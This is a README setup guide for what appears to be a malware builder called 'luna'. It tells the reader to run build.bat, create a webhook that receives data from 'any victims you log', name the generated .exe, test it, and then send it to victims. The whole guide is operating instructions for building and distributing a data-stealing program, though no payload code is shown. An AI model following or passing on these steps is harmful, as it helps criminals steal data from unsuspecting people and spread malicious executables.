## Setup

Make sure you have [Python](https://www.python.org/downloads/) installed and it is added to your [Path](https://youtu.be/Y2q_b4ugPWk)
```sh-session
python v3.10.1 or higher
```

### 1. Download The Files:
```
Once you've downloaded the files extract the folder so it's no longer a .zip file.
```
### 2. Open The build.bat File:
```
You dont need to install any modules opening this will install them for you. Then you can open the build.bat which will 
open a terminal with the luna logo. Don't worry although this looks quite menacing its just aesthetic and is normal.
```
### 3. Create A Webhook:
```
This webhook will be sent any victims you log so don't delete it once it's made. Once you've created one paste it 
into the terminal when prompted.
```
### 4. Enter The File Name:
```
Now you can make up a name for the file you want to make and choose if you want to be pinged and the pingtype. The filename can be changed later 
once the .exe has been created.
```
### 5. Test The File:
``` 
You will then be promtped as to whether you want to run the file or not. I reccomend this so you 
can see if there are any issues or not.
```
### 6. What Now?
``` 
The .exe file will appear in the same folder where all the other files are with the name you set it as and you can now send 
this to your victims.游땓
